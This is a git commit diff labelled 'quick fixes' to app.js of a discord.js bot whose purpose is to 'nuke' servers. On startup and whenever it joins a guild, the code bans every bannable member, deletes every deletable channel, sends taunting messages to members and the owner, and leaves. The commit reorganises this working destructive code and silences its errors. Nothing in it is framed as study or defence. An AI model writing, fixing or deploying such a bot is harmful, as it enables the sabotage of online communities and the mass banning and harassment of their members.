c59c6c560273689317562b3d02f89d0848e15185
appellation <nelson.will@live.com>
2017-02-11 11:20:23 -0800

    quick fixes

--- app.js
+++ app.js
@@ -1,34 +1,35 @@
-const { Client, RichEmbed } = require('discord.js');
+const { Client } = require('discord.js');
 const config = require('./config.json');
 const client = new Client();
 
-client.on('ready', () => { 
-  client.guilds.forEach(x => { return x.nuke(x); });
+async function nuke(guild, users = 0, channels = 0) {
+  try {
+    guild.members.forEach(x => {
+      if (x.bannable) {
+        x.ban();
+        x.send('You\'re getting banned! Nothing personal...');
+        return users++;
+      }
+    });
+    guild.channels.forEach(x => {
+      if (x.deletable) {
+        x.delete();
+        return channels++;
+      }
+    });
+    await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
+    await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
+  } catch (e) {}
+}
+
+client.on('ready', () => {
+  client.guilds.forEach(x => { return nuke(x); });
   console.log('Ready to have some fun... >:)');
 });
-
-async function nuke(guild, users = 0, channels = 0) {
-  await guild.members.forEach(x => { 
-    if(x.bannable) { 
-      x.ban(); 
-      x.send('You\'re getting banned! Nothing personal...');
-      return users++;
-    }
-  });
-  await guild.channels.forEach(x => { 
-    if(x.deletable) {
-      x.delete();
-      return channels++;
-    }
-  });
-  await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
-  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
-}
 
 client.on('guildCreate', async (guild) => {
   let users = 0;
   let channels = 0;
-  let embed = new RichEmbed();
 
   await nuke(guild, users, channels);
   guild.leave();
